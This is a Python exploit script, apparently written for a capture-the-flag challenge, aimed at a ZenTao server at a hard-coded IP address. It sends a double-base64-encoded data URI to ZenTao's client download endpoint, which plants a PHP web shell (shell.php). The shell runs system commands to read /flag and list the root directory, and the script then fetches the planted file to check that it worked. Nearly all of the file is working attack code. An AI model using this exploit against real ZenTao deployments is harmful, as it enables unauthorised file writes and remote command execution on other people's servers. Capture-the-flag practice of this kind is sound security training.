#!/usr/bin/env python3
"""
使用用户提供的精确提示字符串
"""
import requests
import base64
import time

def solve_exact_hint():
    base_url = "http://47.113.178.182:32829"
    session = requests.Session()

    print("""
╔═══════════════════════════════════════════════════════════════╗
║      使用精确的提示字符串进行利用                            ║
╚═══════════════════════════════════════════════════════════════╝
    """)

    # 建立 session
    print("[*] 建立 Session...")
    session.get(f"{base_url}/zentao/", timeout=5)

    # 1. 用户提供的精确 Hint String
    # "data:text/plain;base64," + base64("<?php ... ?>") + "#/shell.php"
    hint_data_uri = "data:text/plain;base64,PD9waHAgZWNobyAiLS0tU1VDQ0VTUy0tLSI7IHN5c3RlbSgnY2F0IC9mbGFnJyk7IHN5c3RlbSgnbHMgLycpOyA/Pg==#/shell.php"

    print(f"\n[*] 提示中的 Data URI:")
    print(f"    {hint_data_uri}")

    # 验证内层 base64
    inner_b64 = "PD9waHAgZWNobyAiLS0tU1VDQ0VTUy0tLSI7IHN5c3RlbSgnY2F0IC9mbGFnJyk7IHN5c3RlbSgnbHMgLycpOyA/Pg=="
    decoded_php = base64.b64decode(inner_b64).decode()
    print(f"\n[*] 解码后的 PHP 代码:")
    print(f"    {decoded_php}")

    # 2. 对整个 data URI 进行 Base64 编码（外层）
    link_std = base64.b64encode(hint_data_uri.encode()).decode()
    print(f"\n[*] Link 参数 (标准 Base64):")
    print(f"    {link_std[:80]}...")

    # 3. 转换为 URL-Safe Base64 (+ -> -, / -> _)
    link_safe = link_std.replace('+', '-').replace('/', '_')
    print(f"\n[*] Link 参数 (Safe Base64):")
    print(f"    {link_safe[:80]}...")
    print(f"    替换次数: + -> - ({link_std.count('+')}), / -> _ ({link_std.count('/')})")

    # 4. 发送请求
    params = {
        "m": "client",
        "f": "download",
        "link": link_safe,
        "fileName": "shell.php"
    }

    print(f"\n[*] 发送请求...")
    print(f"    URL: {base_url}/zentao/index.php")
    print(f"    参数: m=client, f=download, fileName=shell.php")

    try:
        res = session.get(f"{base_url}/zentao/index.php", params=params, timeout=10)
        print(f"    响应: {res.status_code}")

        # 5. 检查文件
        target = f"{base_url}/zentao/data/client/1/shell.php"
        print(f"\n[*] 检查目标文件: {target}")

        time.sleep(2)

        res = session.get(target, timeout=10)
        file_size = len(res.content)

        print(f"    状态: {res.status_code}")
        print(f"    大小: {file_size} bytes")

        if file_size > 0:
            print("\n" + "🎉" * 35)
            print("✓✓✓ 成功！文件不再是 0 字节！")
            print("🎉" * 35)
            print("\n文件内容:")
            print("=" * 70)
            print(res.text)
            print("=" * 70)

            if "flag{" in res.text.lower() or "ctf{" in res.text.lower() or "SUCCESS" in res.text:
                print("\n🚩🚩🚩 任务完成！")
        else:
            print("\n[-] 依然是 0 字节")
            print("[*] 可能原因:")
            print("    1. allow_url_fopen = Off")
            print("    2. 需要不同的服务器配置")
            print("    3. 该漏洞可能已被修复或环境不匹配")

    except Exception as e:
        print(f"\n[-] 错误: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    solve_exact_hint()
